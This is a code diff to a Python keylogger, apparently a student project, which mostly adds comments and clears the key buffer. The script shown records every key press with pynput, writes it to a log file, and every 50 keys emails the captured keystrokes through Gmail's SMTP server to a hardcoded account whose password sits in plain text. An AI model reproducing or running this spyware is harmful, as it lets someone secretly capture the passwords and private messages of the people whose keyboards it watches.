@@ -6,6 +6,7 @@ import ssl
 from pynput.keyboard import Key, Listener
 subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
 
+# Initialise variables
 keys = []
 count = 0
 
@@ -14,9 +15,9 @@ logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asc
 
 # Recording key presses
 def on_press(key):
+    global keys, count
     logging.info(str(key))
     print(key, "typed")
-    global keys, count
     # Adding key pressed to keys array
     keys.append(str(key))
     count+=1
@@ -24,7 +25,10 @@ def on_press(key):
     if count > 50:
         count = 0
         email(keys)
+        # Clear keys array after sending email
+        keys = []
 
+# Send logging content to Email 
 def email(keys):  
     message = ""
     for key in keys:
@@ -40,12 +44,15 @@ def email(keys):
     # Sending the message
     sendEmail(message)
 
+# Email information
 def sendEmail(message):
     # For SSL
     port = 465
     smtp_server = "smtp.gmail.com"
+    # Sender's email
     senderEmail = "fypkeylogger@gmail.com"
     password = "keylog123##"
+    # Receiver's email
     receiverEmail = "fypkeylogger@gmail.com"
     context = ssl.create_default_context()
     with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
